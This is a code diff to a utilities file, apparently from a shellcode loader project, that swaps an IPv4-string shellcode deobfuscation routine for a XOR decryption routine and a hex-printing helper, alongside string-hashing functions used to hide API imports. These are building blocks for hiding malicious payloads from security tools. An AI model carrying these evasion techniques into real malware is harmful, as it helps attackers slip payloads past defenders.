@@ -8,7 +8,28 @@
 
 #include "utils.hpp"
 
-//---------------STRING HASHING--------------------
+/**
+ * Printing HEX data properly.
+ */
+VOID PrintHexData(LPCSTR str, PBYTE payload, SIZE_T sPayload){
+    printf("unsigned char %s[]{", str);
+
+    for(int i = 0; i < sPayload; i++){
+        if(i % 16 == 0){
+            printf("\n\t");
+        }
+
+        if(i < sPayload - 1){
+            printf("0x%02X, ", payload[i]);
+        }
+        else{
+            printf("0x%02X ", payload[i]);
+        }
+    }
+
+    printf("\n");
+}
+
 DWORD HashStringA(LPCSTR str) {
     DWORD hash = 0;
     while (*str) {
@@ -25,35 +46,12 @@ DWORD HashStringW(LPCWSTR str) {
     return hash;
 }
 
-//------------PAYLOAD DEOBFUSCATION-----------------
 
-static VOID IpToBytes(const char* ip, uint8_t* byte_array) {
-    int octet1, octet2, octet3, octet4;
-    sscanf(ip, "%d.%d.%d.%d", &octet1, &octet2, &octet3, &octet4);
-    byte_array[0] = (uint8_t)octet1;
-    byte_array[1] = (uint8_t)octet2;
-    byte_array[2] = (uint8_t)octet3;
-    byte_array[3] = (uint8_t)octet4;
-}
-
-// Fonction pour déobfusquer le shellcode
-PBYTE Ipv4Deobfuscation(const char* obfuscated_shellcode[], size_t shellcode_size) {
-
-    PBYTE deobfuscated_payload = (PBYTE)malloc(shellcode_size * 4);
-    if (deobfuscated_payload == NULL) {
-        printf("[!] Error allocating memory.\n");
-        return NULL;
+/**
+ * XOR using input keys.
+ */
+VOID XorByInputKeys(PBYTE pShellcode, SIZE_T sShellcodeSize, PBYTE pKey, SIZE_T sKeySize){
+    for(size_t i = 0, j = 0; i < sShellcodeSize; i++){
+        pShellcode[i] ^= pKey[i % sKeySize];
     }
-
-    size_t offset = 0;
-
-    for (size_t i = 0; i < shellcode_size; i++) {
-        uint8_t byte_array[4];
-        IpToBytes(obfuscated_shellcode[i], byte_array);
-
-        memcpy(deobfuscated_payload + offset, byte_array, 4);
-        offset += 4;
-    }
-
-    return deobfuscated_payload;
 }
